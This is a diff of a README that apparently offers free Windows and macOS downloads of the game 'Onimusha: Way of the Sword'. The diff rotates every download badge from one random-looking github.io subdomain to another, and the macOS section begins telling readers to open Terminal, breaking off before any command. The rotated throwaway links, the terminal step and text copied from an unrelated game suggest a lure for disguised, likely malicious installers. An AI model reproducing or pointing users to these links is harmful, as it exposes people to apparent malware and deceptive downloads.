@@ -26,7 +26,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Onimusha%3A%20Way%20of%20the%20Sword-F9A825?style=for-the-badge&logo=github)](https://nrotnjxfyuta.github.io/win-setup/)
+[![Download](https://img.shields.io/badge/⬇_Download_Onimusha%3A%20Way%20of%20the%20Sword-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
 
 </div>
 
@@ -65,9 +65,9 @@ Explore, gather loot and resources and help rebuild the dwarven might in this fi
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://nrotnjxfyuta.github.io/win-setup/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
 
 </div>
 
@@ -107,7 +107,7 @@ Explore, gather loot and resources and help rebuild the dwarven might in this fi
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://nrotnjxfyuta.github.io/mac-setup/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://etgysfcihddy.github.io/macos-dl/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
